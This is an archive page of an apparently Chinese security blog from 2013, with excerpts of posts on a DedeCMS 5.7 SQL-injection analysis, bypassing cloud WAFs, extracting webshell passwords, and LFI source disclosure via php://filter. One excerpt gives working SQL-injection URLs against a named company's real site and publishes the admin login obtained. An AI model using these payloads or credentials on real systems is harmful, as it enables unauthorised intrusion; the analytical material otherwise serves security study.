@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Archives: 2013 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-06-24T21:08:11.000Z" itemprop="datePublished">
+          2013-06-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/css/'>css</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1007.seo/">webkit浏览器css设置滚动条</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        主要有下面7个属性  1. ::-webkit-scrollbar 滚动条整体部分，可以设置宽度啥的  2. ::-webkit-scrollbar-button 滚动条两端的按钮  3. ::-webkit-scrollbar-track 外层轨道  4. ::-webkit-scrollbar-track-piece 内层滚动槽  5. ::-webkit-scrollbar-thumb 滚动的滑块  6. ::-webkit-sc
+      
+      </p>
+      
+      <p>
+          <a href="/1007.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-06-17T23:52:14.000Z" itemprop="datePublished">
+          2013-06-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/getshell/'>getshell</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1006.seo/">Dedecms最新注入漏洞分析 download.php</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>【转的360的分析】</p>  <p>最近看到网上曝出的dedecms最新版本的一个注入漏洞利用，漏洞PoC和分析文章也已在网上公开.但是在我实际测试过程当中，发现无法复现。原因是此漏洞的利用需要一定的前提条件，而原分析文章当中并没有交代这些，所以这里将我的分析过程以及一些触发的必要条件总结了一下。</p>  <p>一. 漏洞跟踪</p>  <p>发布时间：2013年6月7日</p>  <p>漏洞描述：</p>  <p>DedeCMS是一个网站应用系统构建平台，也是一个强大的网站内容管理系统。基于PHP+MySQL的技术架构，完全开源加上强大稳定的技术架构，既可以用来构建复杂体系的企业信息门户或电子商务网站平台，也可以用来管理简单内容发布网站，不管是商务资源门户还是娱乐信息门户，它都是您管理网站的好帮手。</p>  <p>漏洞触发的根源在于dedesql.class.php在调用$GLOBALS[‘arrs1’]、$GLOBALS[‘arrs2’]这两个全局变量之前未对其进行初始化，导致能够覆盖任意全局变量。</p>  <p>漏洞危害：因为dedecms的使用非常广泛，而此漏洞利用方便，危害性高，能够远程获取管理后台，进而直接<a href="http://Ha.Cker.In/tag/getshell" target="_blank">getshell</a>获取系统控制权。</p>  <p>触发条件：确保php.ini中使用php_mysql.dll同时未开启php_mysqli.dll，</p>  <p>如图所示：</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00211.jpg"><img title="clip_image001[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="237" alt="clip_image001[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0011.jpg" width="647" border="0" /></a></p>  <p>受影响版本：dedecms 5.7</p>  <p>二. 漏洞原理</p>  <p>首先说一下dedecms不安全的参数处理机制，这里我们看一下/include/common.inc.php代码的第79行：</p>  <p>foreach(Array(‘_GET’,’_POST’,’_COOKIE’) as $_request)</p>  <p>&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; foreach($$_request as $_k =&gt; $_v)</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($_k == ‘nvarname’) ${$_k} = $_v;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; else ${$_k} = _RunMagicQuotes($_v);</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</p>  <p>&#160;&#160;&#160;&#160;&#160; }</p>  <p>万恶之源其实就在这里，基本上目前dede被发现的漏洞全都死在这里。我们可以看到，程序从GPC数组中取出名值对后，只是对$_v做了简单的addslashes处理，就直接赋给了${$_k}，实现了类似全局变量覆盖的机制，设计的初衷是为了开发方便，但却存在着严重的安全问题。PHP在经历了这么多年的更新换代终于修补了register_globals问题，但是dede的这段代码使php付出的努力全部白费。</p>  <p>下面我们回归漏洞。</p>  <p>首先是/include/dedesql.class.php的第589-600行，</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00411.jpg"><img title="clip_image002[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="448" alt="clip_image002[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0021.jpg" width="616" border="0" /></a></p>  <p>在执行这段代码之前，程序未初始化$arrs1和$arrs2这两个数组。结合前面提到的dede不安全的参数处理机制，利用这段代码我们可以控制$GLOBALS[$v1]的值。例如在这个漏洞中，$GLOBALS[$v1]是拼接而成，我们可以控制$GLOBALS[‘cfg_dbprefix’]的值。</p>  <p>然后，我们来看一下如何利用$GLOBALS[‘cfg_dbprefix’]。</p>  <p>这里在/include/dedesql.class.php的第512行SetQuery函数中，代码如下</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00611.jpg"><img title="clip_image003[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="193" alt="clip_image003[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0031.jpg" width="639" border="0" /></a></p>  <p>这里因为$GLOBALS[‘cfg_dbprefix’]是可控的，进而$prefix也是可控的，所以在这儿就造成了SQL注入。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1006.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-06-17T23:38:08.000Z" itemprop="datePublished">
+          2013-06-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/WAF/'>WAF</a>,
+    
+    <a href='/tag/安全宝/'>安全宝</a>,
+    
+    <a href='/tag/白帽子/'>白帽子</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1005.seo/">浅谈安全宝等云端WAF的绕过思路</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        最近一直在搞些web安全，还是有一些收获的。其实我不是黑客，我真的只是白帽子。今天，准备渗透一个站，用了几个传统的注入方式，发现一直在弹出安全宝的拦截信息。让我很不爽，先来介绍一下安全宝。  什么安全宝  安全宝是创新工场的孵化产品，是一个基于云端的WAF(Web Application Firewall)。国内也有一些产品，比如加速乐、360等。这类产品其实是相当于网站的CDN，所有流量通过它进行转发。但是这些服务其实往往无法真正达到
+      
+      </p>
+      
+      <p>
+          <a href="/1005.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-06-16T23:07:32.000Z" itemprop="datePublished">
+          2013-06-17
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL注射/'>SQL注射</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1004.seo/">一个小漏洞可渗透TCL内网</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>一个被忽略的<a href="http://Ha.Cker.In/tag/SQL注射" target="_blank">SQL注射</a>漏洞    <br /><a href="http://fc.tcl.com/cn/search.aspx?k=1&#39;;select%20*%20from%20sysobjects%20where%20@@version%3E0;--">http://fc.tcl.com/cn/search.aspx?k=1&#39;;select%20*%20from%20sysobjects%20where%20@@version%3E0;--</a>    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201305/02112853813026afea42dbdf0c9e674cf7472fa5.png"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="228" alt="clip_image002" src="http://img.cker.in/TCL_D3A7/clip_image002.jpg" width="620" border="0" /></a>    <br />测试其它工具均失效，就穿山甲成功了。但是暴数据的时候穿山甲又挂了    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201305/02112948b4e1ef9f8941e48663bf774b01050b60.png"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="328" alt="clip_image003" src="http://img.cker.in/TCL_D3A7/clip_image003.jpg" width="626" border="0" /></a>    <br />无所谓，自己搞了试试吧。    <br /><a href="http://fc.tcl.com/cn/search.aspx?k=1&#39;;select">http://fc.tcl.com/cn/search.aspx?k=1&#39;;select</a> top 1 password from AdminUsers where password&gt;0;–    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201305/021130570afa58b14a5cb54c4d59f000d8c5ccd3.png"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="162" alt="clip_image005" src="http://img.cker.in/TCL_D3A7/clip_image005.jpg" width="620" border="0" /></a>    <br />最后获取到后台的账号密码：Admin/0101。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1004.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-06-01T08:59:02.000Z" itemprop="datePublished">
+          2013-06-01
+      </time>
+    
+    
+    | 
+    <a href='/tag/Webshell/'>Webshell</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1003.seo/">TNTHK小组内部版webshell密码破解解析</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        下面简单的揭露下怎么获取webshell后门密码    1. 在password登陆框 随便输入一错误密码，提示error，如图：        2. 然后右键查看源文件，搜索[password]，font 后面跟的就是shell的密码，测试一下    3. 按照上面的方法，貌似通杀…  
+      
+      </p>
+      
+      <p>
+          <a href="/1003.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-05-31T11:41:04.000Z" itemprop="datePublished">
+          2013-05-31
+      </time>
+    
+    
+    | 
+    <a href='/tag/DedeCMS/'>DedeCMS</a>,
+    
+    <a href='/tag/defcon/'>defcon</a>,
+    
+    <a href='/tag/LFI/'>LFI</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1002.seo/">php LFI读php文件源码以及直接post webshell</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>最近在忙<a href="http://Ha.Cker.In/tag/defcon" target="_blank">defcon</a>的题目集训 其中有一套题目里 有个老外写的writeup中提到了LFI的另一种小技巧</p>  <p>原文请参考 <a href="http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/">http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/</a></p>  <p>PS: 该技巧并不是新的技术 神牛肯定已经用得觉得无聊了 所以当路过就行了 =_,=~ </p>  <p>我等小菜仅仅当做自己知识的补充~ （默默蹲墙角ing~）</p>  <p>假设如下一个场景   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p>(1) <a href="http://vulnerable/fileincl/example1.php?page=intro.php">http://vulnerable/fileincl/example1.php?page=intro.php</a>（该php文件包含LFI漏洞)&#160; </p>            <p>(2) 但是你没有地方可以upload你的webshell代码</p>            <p>(3) LFI只能读取到非php文件的源码（因为无法解析执行 只能被爆菊花）</p>            <p>(4) 如果你能读取到config.php之类文件 或许可以直接拿到数据库账号远程入侵进去</p>            <p>【现在的问题是】 LFI如何读取到php文件的源码?</p>         </td>       </tr>     </tbody></table> </p>  <p>于是给大家做个演示 如果我正常用<a href="http://Ha.Cker.In/tag/LFI" target="_blank">LFI</a>去读/sqli/db.php文件 是无法读取它的源码 它会被当做php文件被执行    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=../sqli/db.php">http://vulnerable/fileincl/example1.php?page=../sqli/db.php</a></p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image001.jpg"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="201" alt="clip_image001" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image001_thumb.jpg" width="656" border="0" /></a></p>  <p>但是如果我用老外文章里说提到的方法 就能把指定php文件的源码以base64方式编码并被显示出来   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=../sqli/db.php">http://vulnerable/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=../sqli/db.php</a></p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image003.jpg"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="180" alt="clip_image003" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image003_thumb.jpg" width="778" border="0" /></a></p>  <p>/sqli/db.php源码base64编码后的内容显示如下   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>1</p>         </td>          <td width="667">           <p>PD9waHAgCiAgJGxuayA9IG15c3FsX2Nvbm5lY3QoImxvY2FsaG9zdCIsICJwZW50ZXN0ZXJsYWIiLCAicGVudGVzdGVybGFiIik7CiAgJGRiID0gbXlzcWxfc2VsZWN0X2RiKCdleGVyY2lzZXMnLCAkbG5rKTsKPz4K</p>         </td>       </tr>     </tbody></table> </p>  <p>然后我们再去进行base64解码 解码后/sqli/db.php文件的源码一览无遗</p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image004.jpg"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="394" alt="clip_image004" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image004_thumb.jpg" width="598" border="0" /></a></p>  <p>看上去好像很厉害的样子…… 但是 =_,=||~ 再继续看下文~</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1002.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <nav class="pagination" role="pagination">
+    <a class="newer-posts" href="/archives/2013/page/9/">← Newer Posts</a>
+    <span class="page-number">Page 10 of 16</span>
+    <a class="older-posts" href="/archives/2013/page/11/">Older Posts →</a>
+  </nav>
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
